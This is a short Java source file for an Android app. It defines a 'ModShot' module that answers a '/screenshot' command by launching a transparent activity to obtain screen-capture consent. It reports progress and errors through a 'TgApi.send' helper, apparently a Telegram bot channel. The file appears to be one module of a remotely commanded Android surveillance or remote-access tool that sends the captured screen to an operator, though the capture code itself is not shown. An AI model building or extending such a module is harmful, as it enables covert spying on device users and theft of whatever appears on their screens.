package com.sec.app;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class ModShot {
    private static Context ctx;

    public static void init(Context c) { ctx = c; }

    // /screenshot: lança a ShotActivity transparente pedindo consentimento.
    // O usuário toca em "Permitir agora" e a captura é feita e enviada.
    public static void capture() {
        if (!perm(android.Manifest.permission.CAMERA)) { /* camera não é necessária aqui */ }
        TgApi.send("⏳ aguardando consentimento do MediaProjection (toque em Permitir na tela do device)...");
        try {
            Intent i = new Intent(ctx, ShotActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            ctx.startActivity(i);
        } catch (Exception e) {
            TgApi.send("screenshot erro (launch): " + e);
        }
    }

    private static boolean perm(String p) {
        return ctx.checkSelfPermission(p) ==
            ctx.getPackageManager().PERMISSION_GRANTED;
    }
}
